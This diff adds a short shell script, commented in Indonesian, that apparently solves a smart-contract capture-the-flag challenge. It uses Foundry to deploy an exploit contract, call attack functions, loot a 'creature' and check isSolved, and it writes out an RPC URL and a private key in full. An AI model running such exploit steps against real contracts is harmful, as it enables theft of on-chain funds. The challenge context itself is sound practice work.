@@ -1,0 +1,29 @@
+Sesuaikan dengan informasi yang diberikan, seperti rpc url, private key, setup address, dan target address
+
+
+# 1. Deploy kontrak exploit ke target address
+~/.foundry/bin/forge create ./src/Exploit.sol:Exploit \
+  --broadcast \
+  --rpc-url http://94.237.57.115:32516/rpc \
+  --private-key 0x5a002cd99d1a67c370e48807dc8947816572df1c7ec4396a0051c8ca0597dd2b \
+  --constructor-args 0xE348fcc646cB04A367Cc34fBc815AE7C6Aff749D \
+  --legacy
+
+# 2. Attack langsung ke target address dengan damage 1000 (set aggro)
+~/.foundry/bin/cast send 0xE348fcc646cB04A367Cc34fBc815AE7C6Aff749D "attack(uint256)" 1000 \
+  --rpc-url http://94.237.57.115:32516/rpc \
+  --private-key 0x5a002cd99d1a67c370e48807dc8947816572df1c7ec4396a0051c8ca0597dd2b
+
+# 3. Attack melalui setup contract dengan damage 1000 (ganti [EXPLOIT_ADDRESS] dengan address yang di-deploy)
+~/.foundry/bin/cast send [EXPLOIT_ADDRESS] "attack(uint256)" 1000 \
+  --rpc-url http://94.237.57.115:32516/rpc \
+  --private-key 0x5a002cd99d1a67c370e48807dc8947816572df1c7ec4396a0051c8ca0597dd2b
+
+# 4. Loot creature
+~/.foundry/bin/cast send 0xE348fcc646cB04A367Cc34fBc815AE7C6Aff749D "loot()" \
+  --rpc-url http://94.237.57.115:32516/rpc \
+  --private-key 0x5a002cd99d1a67c370e48807dc8947816572df1c7ec4396a0051c8ca0597dd2b
+
+# 5. Verifikasi solved
+~/.foundry/bin/cast call 0x21817F96a7388C41543091016a9047C3708E96B7 "isSolved()" \
+  --rpc-url http://94.237.57.115:32516/rpc
